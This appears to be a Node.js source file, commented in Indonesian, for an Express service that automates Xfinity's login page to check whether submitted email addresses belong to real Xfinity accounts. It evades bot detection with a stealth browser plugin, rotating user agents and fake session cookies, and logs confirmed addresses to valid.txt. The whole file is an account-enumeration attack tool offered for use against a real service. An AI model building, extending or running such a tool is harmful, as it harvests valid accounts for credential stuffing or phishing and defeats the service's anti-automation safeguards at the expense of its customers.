const express = require('express');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const fs = require('fs');
const path = require('path'); // Untuk mengelola jalur file

// Menggunakan Stealth Plugin
puppeteer.use(StealthPlugin());

// ANSI escape codes for coloring output
const colors = {
    reset: '\x1b[0m',
    green: '\x1b[32m',
    red: '\x1b[31m',
    yellow: '\x1b[33m',
};

// Fungsi untuk membaca User-Agent dari file ua.txt
function readUserAgentsFromFile(filePath) {
    try {
        const data = fs.readFileSync(filePath, 'utf-8');
        return data.split('\n').filter(line => line.trim() !== ''); // Menghapus baris kosong
    } catch (error) {
        console.error(`${colors.red}[ERROR] Failed to read User-Agent file: ${error}${colors.reset}`);
        return []; // Mengembalikan array kosong jika gagal
    }
}

// Membaca User-Agent dari file ua.txt
const userAgents = readUserAgentsFromFile('ua.txt');

// Fungsi untuk memilih User-Agent acak
function getRandomUserAgent() {
    const randomIndex = Math.floor(Math.random() * userAgents.length);
    return userAgents[randomIndex];
}

// Fungsi untuk menghapus karakter tidak valid dari User-Agent
function sanitizeUserAgent(userAgent) {
    return userAgent.replace(/[^ -~]+/g, ''); // Menghapus karakter non-printable
}

// Fungsi untuk delay
function delay(time) {
    return new Promise(resolve => setTimeout(resolve, time));
}

// Fungsi untuk membuat cookie random
function generateRandomCookies() {
    const randomString = () => Math.random().toString(36).substring(2, 15); // String acak
    const cookies = [
        { name: 'session', value: randomString(), domain: '.xfinity.com', path: '/' },
        { name: 'user_id', value: randomString(), domain: '.xfinity.com', path: '/' },
        { name: 'token', value: randomString(), domain: '.xfinity.com', path: '/' }
    ];
    return cookies;
}

// Fungsi untuk memuat cookies random ke dalam halaman
async function setRandomCookies(page) {
    const cookies = generateRandomCookies();
    await page.setCookie(...cookies);
    //console.log(`${colors.green}[INFO] Random cookies have been set successfully.${colors.reset}`);
}

// Fungsi untuk menyimpan konten respons ke file HTML
async function saveResponseToFile(email, content) {
    const sanitizedEmail = email.replace(/[^a-zA-Z0-9]/g, '_'); // Sanitasi email untuk nama file
    const filePath = path.join(__dirname, 'response', `${sanitizedEmail}.html`);
    fs.writeFileSync(filePath, content);
    //console.log(`${colors.green}[INFO] Response saved to ${filePath}${colors.reset}`);
}

// Fungsi untuk cek email terdaftar di Xfinity
async function checkEmail(email) {
    const browser = await puppeteer.launch({
        headless: true, // Ubah ke false untuk mode debugging
        args: [
            '--no-sandbox', 
            '--disable-setuid-sandbox',
            '--disable-gpu',
            '--disable-dev-shm-usage',
            '--disable-software-rasterizer',
            '--no-zygote',
        ],
        executablePath: process.env.CHROME_PATH || '/usr/bin/google-chrome', // Jalur ke instalasi Chrome di Windows
        slowMo: 100 // Menambahkan slow motion 100ms
    });
    const page = await browser.newPage();

    await setRandomCookies(page); // Set cookie random

    // Set User-Agent acak
    const userAgent = sanitizeUserAgent(getRandomUserAgent());
    try {
        await page.setUserAgent(userAgent);
        //console.log(`${colors.green}[INFO] Random User-Agent set: ${userAgent}${colors.reset}`);
    } catch (error) {
        console.error(`${colors.red}[ERROR] Failed to set User-Agent: ${error}${colors.reset}`);
        return { email: email, status: 'ERROR' };
    }

    // Menambahkan header HTTP
    await page.setExtraHTTPHeaders({
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    });

    try {
        await page.goto('https://login.xfinity.com/login', { timeout: 60000 });

        // Tunggu sampai input email tersedia
        await page.waitForSelector('#user', { timeout: 10000 });
        await page.type('#user', email);

        // Tambahkan delay sebelum mengklik
        await delay(2000);

        // Tekan tombol submit
        await Promise.all([
            page.click('#sign_in'),
            page.waitForNavigation({ waitUntil: 'networkidle0', timeout: 60000 }) // Tunggu sampai navigasi selesai
        ]);

        // Ambil konten halaman setelah klik
        const content = await page.content();

        // Simpan konten ke file HTML
        await saveResponseToFile(email, content);

        // Cek apakah email tidak ditemukan di halaman respons
        if (content.includes('The Xfinity ID you entered was incorrect')) {
            console.log(`${colors.red}[FAILED] ${email}${colors.reset}`);
            fs.appendFileSync('bad.txt', `${email}\n`); // Simpan ke bad.txt
            return { email: email, status: 'FAILED' };
        } else {
            console.log(`${colors.green}[SUCCESS] ${email}${colors.reset}`);
            fs.appendFileSync('valid.txt', `${email}\n`); // Simpan ke valid.txt
            return { email: email, status: 'SUCCESS' };
        }

    } catch (error) {
        console.log(`${colors.yellow}[ERROR] ${email}: ${error}${colors.reset}`);
        fs.appendFileSync('bad.txt', `${email}\n`); // Simpan ke bad.txt jika ada error
        return { email: email, status: 'ERROR' };
    } finally {
        await browser.close();
    }
}

// Inisialisasi Express
const app = express();
const PORT = process.env.PORT || 3000;

// Endpoint untuk memeriksa email
app.get('/validator', async (req, res) => {
    const email = req.query.email; // Ambil email dari query parameter
    if (!email) {
        return res.status(400).send(`${colors.red}[ERROR] Email must be provided as a query parameter.${colors.reset}`);
    }
    try {
        const result = await checkEmail(email);
        res.json(result);
    } catch (error) {
        res.status(500).send(`${colors.red}[ERROR] ${error}${colors.reset}`);
    }
});

// Menjalankan server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
